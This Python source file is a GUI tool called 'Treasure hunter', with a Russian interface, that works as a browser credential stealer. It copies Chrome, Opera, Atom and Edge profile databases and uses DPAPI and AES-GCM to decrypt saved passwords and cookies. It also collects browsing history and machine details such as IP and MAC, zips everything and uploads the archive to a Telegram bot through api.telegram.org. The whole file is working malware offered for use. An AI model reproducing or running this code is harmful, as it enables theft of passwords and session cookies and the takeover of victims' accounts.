import base64
import json
import re
import socket
from tkinter import filedialog
import uuid
from tkinter import *
from tkinter import messagebox
import customtkinter
from datetime import datetime, timedelta
import os
from Crypto.Cipher import AES
import sqlite3
import win32crypt
import shutil
import requests
import zipfile
import platform
import psutil
from pathlib import Path


class Window:
    customtkinter.set_appearance_mode("light")
    customtkinter.set_default_color_theme("dark-blue")
    window = customtkinter.CTk()
    window.title("Treasure hunter")
    window.iconbitmap(r'D:\Загрузки\icons8.ico')
    window.geometry('750x250')
    window.resizable(width=False, height=False)

    directory = ''
    count_true = 0

    chk_state_chrome_psw = BooleanVar()
    chk_state_chrome_psw.set(False)

    chk_state_opera_psw = BooleanVar()
    chk_state_opera_psw.set(False)

    chk_state_atom_psw = BooleanVar()
    chk_state_atom_psw.set(False)

    chk_state_edge_psw = BooleanVar()
    chk_state_edge_psw.set(False)

    chk_state_chrome_cookies = BooleanVar()
    chk_state_chrome_cookies.set(False)

    chk_state_opera_cookies = BooleanVar()
    chk_state_opera_cookies.set(False)

    chk_state_atom_cookies = BooleanVar()
    chk_state_atom_cookies.set(False)

    chk_state_edge_cookies = BooleanVar()
    chk_state_edge_cookies.set(False)

    chk_state_chrome_history = BooleanVar()
    chk_state_chrome_history.set(False)

    chk_state_opera_history = BooleanVar()
    chk_state_opera_history.set(False)

    chk_state_atom_history = BooleanVar()
    chk_state_atom_history.set(False)

    chk_state_edge_history = BooleanVar()
    chk_state_edge_history.set(False)

    chk_state_info = BooleanVar()
    chk_state_info.set(False)

    TOKEN_var = StringVar(value='')
    CHAT_ID_var = StringVar(value='')

    chk_state_list = [chk_state_chrome_psw, chk_state_chrome_cookies, chk_state_chrome_history, chk_state_opera_psw,
                      chk_state_opera_cookies, chk_state_opera_history, chk_state_atom_psw,
                      chk_state_atom_cookies, chk_state_atom_history, chk_state_edge_psw, chk_state_edge_cookies,
                      chk_state_edge_history, chk_state_info]

    frame = customtkinter.CTkFrame(
        master=window,
        width=5000,
        height=5000,
        fg_color='white',
        bg_color='white'
    )
    frame.grid(sticky='nsew')

    def show_msg(self, boolean):
        if boolean:
            messagebox.showinfo(title='Treasure hunter', message='Данные успешно получены')
        else:
            messagebox.showerror(title='Treasure hunter', message='Выберите функцию')

    def get_chk_state_chrome_psw(self):
        return self.chk_state_chrome_psw

    def get_chk_state_chrome_cookies(self):
        return self.chk_state_chrome_cookies

    def true_count(self):
        for state in self.chk_state_list:
            if state.get():
                self.count_true += 1

    def generate_window(self):
        lbl = customtkinter.CTkLabel(self.frame, text="Выберите необходимую функцию", text_font=("Arial", 14))
        lbl.grid(row=0, column=0, padx=0, pady=5, columnspan=4)

        self.generate_buttons()

        self.window.mainloop()

    def generate_buttons(self):
        dir_button = customtkinter.CTkButton(self.frame, text='Выбрать место для сохранения',
                                             command=self.set_dir, text_color='white', fg_color='black')
        dir_button.grid(column=1, row=8, sticky=W + S, padx=0, pady=5)

        zip_button = customtkinter.CTkButton(self.frame, text='Упаковать в zip архив', command=self.packing_in_zip,
                                             text_color='white', fg_color='black', width=200)
        zip_button.grid(column=0, row=8, sticky=W + S, padx=5, pady=5)

        TOKEN_entry = customtkinter.CTkEntry(self.frame, placeholder_text='TOKEN')
        self.TOKEN_var = TOKEN_entry
        TOKEN_entry.grid(column=1, row=1, sticky=W, padx=5, pady=5)

        CHAT_ID_entry = customtkinter.CTkEntry(self.frame, placeholder_text='CHAT_ID')
        self.CHAT_ID_var = CHAT_ID_entry
        CHAT_ID_entry.grid(column=2, row=1, sticky=W, padx=5, pady=5)

        start_btn = customtkinter.CTkButton(self.frame, text='Начать',
                                            command=self.check_select, text_color='white', fg_color='black')
        start_btn.grid(column=2, row=8, sticky=W + S, padx=5, pady=5)

        telegram_button = customtkinter.CTkButton(self.frame, text='Отправить боту telegram',
                                                  command=self.send_zip, text_color='white', fg_color='black')
        telegram_button.grid(column=3, row=8, sticky=W + S, padx=2, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Информация о машине',
                                        variable=self.chk_state_info)
        chk.grid(column=0, row=1, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Пароли Chrome',
                                        variable=self.chk_state_chrome_psw)
        chk.grid(column=0, row=2, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Cookies Chrome',
                                        variable=self.chk_state_chrome_cookies)
        chk.grid(column=1, row=2, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='История Chrome',
                                        variable=self.chk_state_chrome_history)
        chk.grid(column=2, row=2, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Пароли Opera',
                                        variable=self.chk_state_opera_psw)
        chk.grid(column=0, row=3, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Cookies Opera',
                                        variable=self.chk_state_opera_cookies)
        chk.grid(column=1, row=3, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='История Opera',
                                        variable=self.chk_state_opera_history)
        chk.grid(column=2, row=3, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Пароли Atom',
                                        variable=self.chk_state_atom_psw)
        chk.grid(column=0, row=4, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Cookies Atom',
                                        variable=self.chk_state_atom_cookies)
        chk.grid(column=1, row=4, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='История Atom',
                                        variable=self.chk_state_atom_history)
        chk.grid(column=2, row=4, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Пароли Edge',
                                        variable=self.chk_state_edge_psw)
        chk.grid(column=0, row=5, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='Cookies Edge',
                                        variable=self.chk_state_edge_cookies)
        chk.grid(column=1, row=5, sticky=W, padx=5, pady=5)

        chk = customtkinter.CTkCheckBox(self.frame, text='История Edge',
                                        variable=self.chk_state_edge_history)
        chk.grid(column=2, row=5, sticky=W, padx=5, pady=5)

    def send_zip(self):
        if self.TOKEN_var.get() == '':
            messagebox.showerror(title='Treasure hunter', message='Введите TOKEN')
            return
        elif self.CHAT_ID_var.get() == '':
            messagebox.showerror(title='Treasure hunter', message='Введите CHAT_ID')
        elif str(self.get_dir()) != '.' and os.path.exists(self.get_dir() / 'treasures.zip'):
            URL = 'https://api.telegram.org/bot'
            files = {'document': open(self.get_dir() / 'treasures.zip', 'rb')}
            requests.get(f'{URL}{self.TOKEN_var.get()}/sendDocument?chat_id={self.CHAT_ID_var.get()}', files=files)
        elif self.get_dir() == '.':
            messagebox.showerror(title='Treasure hunter', message='Выберите папку')
        elif not os.path.exists(self.get_dir() / 'treasures.zip'):
            messagebox.showerror(title='Treasure hunter', message='Создайте архив')

    def set_dir(self):
        self.directory = filedialog.askdirectory()

    def get_dir(self):
        return Path(self.directory)

    def packing_in_zip(self):
        if str(self.get_dir()) != '.':
            source = [self.get_dir() / 'chrome_data', self.get_dir() / 'opera_data', self.get_dir() / 'atom_data',
                      self.get_dir() / 'edge_data', self.get_dir() / 'info']
            zip_file = zipfile.ZipFile(self.get_dir() / 'treasures.zip', 'w')
            for source_folder in source:
                if os.path.exists(source_folder):
                    for root, dirs, files in os.walk(source_folder):
                        for file in files:
                            zip_file.write(os.path.join(root, file), compress_type=zipfile.ZIP_DEFLATED)
            zip_file.close()
            messagebox.showinfo(title='Treasure hunter', message='Данные добавлены в архив')
        else:
            messagebox.showerror(title='Treasure hunter', message='Выберите папку')

    def create_dir_and_collect_profiles(self, paths_browser):
        decrypt = Decrypt()

        if not os.path.exists(self.get_dir() / paths_browser["dir_name"]):
            os.mkdir(self.get_dir() / paths_browser["dir_name"])

        decrypt.collect_profiles(paths_browser)

    def check_select(self):
        paths_chrome = {"browser_directory": "Local/Google/Chrome/User Data", "Login Data": "Login Data",
                        "Cookies": "Network/Cookies", "Local State": "Local State", "dir_name": "chrome_data",
                        "History": "History"}

        paths_opera = {"browser_directory": "Roaming/Opera Software/Opera Stable", "Login Data": "Login Data",
                       "Cookies": "Network/Cookies", "Local State": "Local State", "dir_name": "opera_data",
                       "History": "History"}

        paths_atom = {"browser_directory": "Local/Mail.Ru/Atom/User Data", "Login Data": "Login Data",
                      "Cookies": "Network/Cookies", "Local State": "Local State", "dir_name": "atom_data",
                      "History": "History"}

        paths_edge = {"browser_directory": "Local/Microsoft/Edge/User Data", "Login Data": "Login Data",
                      "Cookies": "Network/Cookies", "Local State": "Local State", "dir_name": "edge_data",
                      "History": "History"}

        decrypt = Decrypt()
        self.true_count()

        if str(self.get_dir()) != '.' and self.count_true != 0:
            for _ in range(self.count_true):

                if self.chk_state_chrome_psw.get():
                    self.create_dir_and_collect_profiles(paths_chrome)
                    decrypt.get_master_key(paths_chrome)

                    chrome_directory = self.get_dir() / paths_chrome["dir_name"] / paths_chrome["Login Data"]
                    file = open(self.get_dir() / paths_chrome["dir_name"] / 'google_psw.txt', 'w')
                    file.write(str(decrypt.password_decrypt_process(paths_chrome, chrome_directory)) + '\n')
                    file.close()
                    self.chk_state_chrome_psw.set(False)

                elif self.chk_state_chrome_cookies.get():
                    self.create_dir_and_collect_profiles(paths_chrome)
                    decrypt.get_master_key(paths_chrome)

                    chrome_directory = self.get_dir() / paths_chrome["dir_name"] / 'Cookies'
                    file = open(self.get_dir() / paths_chrome["dir_name"] / 'google_cookies.txt', 'w')
                    file.write(str(decrypt.cookies_decrypt_process(paths_chrome, chrome_directory)) + '\n')
                    file.close()
                    self.chk_state_chrome_cookies.set(False)

                elif self.chk_state_chrome_history.get():
                    self.create_dir_and_collect_profiles(paths_chrome)

                    chrome_directory = self.get_dir() / paths_chrome["dir_name"] / paths_chrome["History"]
                    file = open(self.get_dir() / paths_chrome["dir_name"] / 'google_history.txt', 'w', encoding='utf-8')
                    file.write(decrypt.get_history_process(chrome_directory) + '\n')
                    file.close()
                    self.chk_state_chrome_history.set(False)

                elif self.chk_state_opera_psw.get():
                    self.create_dir_and_collect_profiles(paths_opera)
                    decrypt.get_master_key(paths_opera)

                    opera_directory = window.get_dir() / paths_opera["dir_name"] / paths_opera["Login Data"]
                    file = open(window.get_dir() / paths_opera["dir_name"] / 'opera_psw.txt', 'w')
                    file.write(str(decrypt.password_decrypt_process(paths_opera, opera_directory)) + '\n')
                    # file.write(str(opera.opera()) + '\n')
                    file.close()
                    self.chk_state_opera_psw.set(False)

                elif self.chk_state_opera_cookies.get():
                    self.create_dir_and_collect_profiles(paths_opera)
                    decrypt.get_master_key(paths_opera)

                    opera_directory = self.get_dir() / paths_opera["dir_name"] / 'Cookies'
                    file = open(self.get_dir() / paths_opera["dir_name"] / 'opera_cookies.txt', 'w')
                    file.write(str(decrypt.cookies_decrypt_process(paths_opera, opera_directory)) + '\n')
                    file.close()
                    self.chk_state_opera_cookies.set(False)

                elif self.chk_state_opera_history.get():
                    self.create_dir_and_collect_profiles(paths_opera)

                    opera_directory = self.get_dir() / paths_opera["dir_name"] / paths_opera["History"]
                    file = open(self.get_dir() / paths_opera["dir_name"] / 'opera_history.txt', 'w', encoding='utf-8')
                    file.write(decrypt.get_history_process(opera_directory) + '\n')
                    file.close()
                    self.chk_state_opera_history.set(False)

                elif self.chk_state_atom_psw.get():
                    self.create_dir_and_collect_profiles(paths_atom)
                    decrypt.get_master_key(paths_atom)

                    atom_directory = window.get_dir() / paths_atom["dir_name"] / paths_atom["Login Data"]
                    file = open(window.get_dir() / paths_atom["dir_name"] / 'atom_psw.txt', 'w')
                    file.write(str(decrypt.password_decrypt_process(paths_atom, atom_directory)) + '\n')
                    # file.write(str(opera.opera()) + '\n')
                    file.close()
                    self.chk_state_atom_psw.set(False)

                elif self.chk_state_atom_cookies.get():
                    self.create_dir_and_collect_profiles(paths_atom)
                    decrypt.get_master_key(paths_atom)

                    atom_directory = self.get_dir() / paths_atom["dir_name"] / 'Cookies'
                    file = open(self.get_dir() / paths_atom["dir_name"] / 'atom_cookies.txt', 'w')
                    file.write(str(decrypt.cookies_decrypt_process(paths_atom, atom_directory)) + '\n')
                    file.close()
                    self.chk_state_atom_cookies.set(False)

                elif self.chk_state_atom_history.get():
                    self.create_dir_and_collect_profiles(paths_atom)

                    atom_directory = self.get_dir() / paths_opera["dir_name"] / paths_atom["History"]
                    file = open(self.get_dir() / paths_atom["dir_name"] / 'atom_history.txt', 'w', encoding='utf-8')
                    file.write(decrypt.get_history_process(atom_directory) + '\n')
                    file.close()
                    self.chk_state_atom_history.set(False)

                elif self.chk_state_edge_psw.get():
                    self.create_dir_and_collect_profiles(paths_edge)

                    edge_directory = self.get_dir() / paths_edge["dir_name"] / paths_edge["Login Data"]
                    file = open(self.get_dir() / paths_edge["dir_name"] / 'edge_psw.txt', 'w')
                    file.write(str(decrypt.password_decrypt_process(paths_edge, edge_directory)) + '\n')
                    file.close()
                    self.chk_state_edge_psw.set(False)

                elif self.chk_state_edge_cookies.get():
                    self.create_dir_and_collect_profiles(paths_edge)

                    edge_directory = self.get_dir() / paths_edge["dir_name"] / 'Cookies'
                    file = open(self.get_dir() / paths_edge["dir_name"] / 'edge_cookies.txt', 'w')
                    file.write(str(decrypt.cookies_decrypt_process(paths_edge, edge_directory)) + '\n')
                    file.close()
                    self.chk_state_edge_cookies.set(False)

                elif self.chk_state_edge_history.get():
                    self.create_dir_and_collect_profiles(paths_edge)

                    edge_directory = self.get_dir() / paths_edge["dir_name"] / paths_edge["History"]
                    file = open(self.get_dir() / paths_edge["dir_name"] / 'edge_history.txt', 'w', encoding='utf-8')
                    file.write(decrypt.get_history_process(edge_directory) + '\n')
                    file.close()
                    self.chk_state_edge_history.set(False)

                elif self.chk_state_info.get():
                    user_information()
                    self.chk_state_info.set(False)
            if self.count_true > 0:
                self.show_msg(True)
                self.count_true = 0
        elif self.count_true == 0 and str(self.get_dir()) != '.':
            messagebox.showerror(title='Treasure hunter', message='Выберите функцию')
        else:
            messagebox.showerror(title='Treasure hunter', message='Выберите путь')


class Decrypt:
    def collect_profiles(self, paths):
        profiles = ['Profile ' + str(x) for x in range(100)]
        profiles.append('Default')
        profiles.append('')
        for profile in profiles:
            work_dir = Path().home() / 'AppData' / paths["browser_directory"] / profile
            if os.path.exists(work_dir):
                try:
                    shutil.copy2(work_dir / paths["Login Data"], window.get_dir() / paths["dir_name"])
                    shutil.copy2(work_dir / paths["Cookies"], window.get_dir() / paths["dir_name"])
                    shutil.copy2(work_dir / paths["History"], window.get_dir() / paths["dir_name"])
                except:
                    pass
        shutil.copy2(Path.home() / 'AppData' / paths["browser_directory"] / paths["Local State"],
                     window.get_dir() / paths["dir_name"])

    def get_master_key(self, paths):
        with open(window.get_dir() / paths["dir_name"] / 'Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"

    def password_decrypt_process(self, paths, directory):
        text = 'URL | LOGIN | PASSWORD' + '\n'
        conn = sqlite3.connect(directory)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        master_key = self.get_master_key(paths)
        for result in cursor.fetchall():
            decrypted_password = self.decrypt_password(result[2], master_key)
            login = result[1]
            url = result[0]
            if decrypted_password != '':
                text += url + ' | ' + login + ' | ' + decrypted_password + '\n'
        return text

    def get_datetime(self, chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def cookies_decrypt_process(self, paths, directory):
        key = self.get_master_key(paths)
        text = '' + '\n'
        conn = sqlite3.connect(directory)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = self.decrypt_password(encrypted_value, key)
            else:
                decrypted_value = value
            text += f"""
                Host: {host_key}
                Cookie name: {name}
                Cookie value (decrypted): {decrypted_value}
                Creation datetime (UTC): {self.get_datetime(creation_utc)}
                Last access datetime (UTC): {self.get_datetime(last_access_utc)}
                Expires datetime (UTC): {self.get_datetime(expires_utc)}
                ===============================================================
                """
        return text

    def get_history_process(self, directory):
        text = '' + '\n'
        conn = sqlite3.connect(directory)
        cursor = conn.cursor()
        cursor.execute("SELECT id, url, title FROM urls")
        for id, url, title in cursor.fetchall():
            text += f'ID: {id} | URL: {url} | Title: {title} \n'
        return text


def user_information():
    if not os.path.exists(window.get_dir() / 'info'):
        os.mkdir(window.get_dir() / 'info')
    file = open(window.get_dir() / 'info' / 'info.txt', 'w')
    file.write(str(platform.uname()) + '\n')
    file.write(str(platform.python_build()) + '\n')
    file.write(f'Процессор: \nКоличество ядер: {psutil.cpu_count(logical=False)}  \n')
    file.write(f'Частота ядер: {psutil.cpu_freq(percpu=True)} \n')
    file.write(f'Текущая загрузка ЦП: {psutil.cpu_percent(interval=None)}% \n')
    file.write(f'Заряд: {psutil.sensors_battery()} \n')
    file.write(f'Память/Диски: \nRAM: {psutil.virtual_memory()} \n')
    file.write(f'Внешние носители: {psutil.disk_partitions()} \n')
    for i in range(len(psutil.disk_partitions())):
        device = psutil.disk_partitions()[i].device
        file.write(f'Диск {device}: {psutil.disk_usage(device)} \n')
    file.write(f'Сети: \nIP: {requests.get("https://ip.beget.ru/").text}')
    file.write(f'Local IP: {socket.gethostbyname(socket.gethostname())} \n')
    file.write(f'MAC: {":".join(re.findall("..", hex(uuid.getnode())[2::]))} \n')
    for key, value in dict(psutil.net_io_counters(pernic=True)).items():
        file.write(f'{key}: {value} \n')
    file.write(f'Сетевые карты: \n')
    for key, value in dict(psutil.net_if_stats()).items():
        file.write(f'{key}: {value} \n')


if __name__ == '__main__':
    window = Window()
    window.generate_window()